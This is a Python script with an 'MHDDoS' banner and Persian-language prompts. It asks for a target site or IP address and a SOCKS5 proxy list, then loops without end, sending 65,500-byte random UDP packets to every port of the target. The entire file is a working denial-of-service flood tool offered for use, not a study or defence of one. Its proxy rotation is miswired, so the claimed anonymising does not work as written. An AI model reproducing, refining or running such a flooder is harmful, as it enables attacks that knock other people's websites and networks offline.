import socket
import socks
import random
from time import sleep

def print_slow(txt):
    for x in txt:                     # cycle through the text one character at a time
        print(x, end='', flush=True)  # print one character, no new line, flush buffer
        sleep(0.1)
    print() # go to new line
print('''
\033c
\033[91m +--------------------------------------------+
\033[92m         ┏━┓┏━┓ ┏┓ ┏┓ ┏━━━┓ ┏━━━┓ ┏━━━┓
\033[92m         ┃┃┗┛┃┃ ┃┃ ┃┃ ┗┓┏┓┃ ┃┏━┓┃ ┃┏━┓┃
\033[92m         ┃┏┓┏┓┃ ┃┗━┛┃  ┃┃┃┃ ┃┃ ┃┃ ┃┗━━┓
\033[92m         ┃┃┃┃┃┃ ┃┏━┓┃  ┃┃┃┃ ┃┃ ┃┃ ┗━━┓┃
\033[92m         ┃┃┃┃┃┃ ┃┃ ┃┃ ┏┛┗┛┃ ┃┗━┛┃ ┃┗━┛┃
\033[92m         ┗┛┗┛┗┛ ┗┛ ┗┛ ┗━━━┛ ┗━━━┛ ┗━━━┛    
\033[91m +--------------------------------------------+''')
print_slow('\033[94m      Coded By MH_ProDev, Anti-Hack')
print('''\033[91m +--------------------------------------------+\033[97m''')

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
ip = input("\n\033[96m❖ \033[97mAddress Site Ya IP Vared Kunid » \033[0m")
bytes = random._urandom(65500)
port = 1
proxy = "127.0.0.1"
proxylist = input("\n\033[96m❖ \033[97mList Proxy Haro Vared Kunid [socks5.txt] » \033[0m")
with open(proxylist, "r") as f:
    lines = f.readlines()
while True:
  try:
    if port == 65535:
      port = 1
    proxy = random.choice(lines)
    socks.set_default_proxy(socks.SOCKS5, proxy)
    sock.sendto(bytes,(ip,port))
    port = port + 1
    print("\033[97m[\033[92m!\033[97m] \033[97mPacket Sended By\033[96m", proxy)
      
  except KeyboardInterrupt:
    exit()
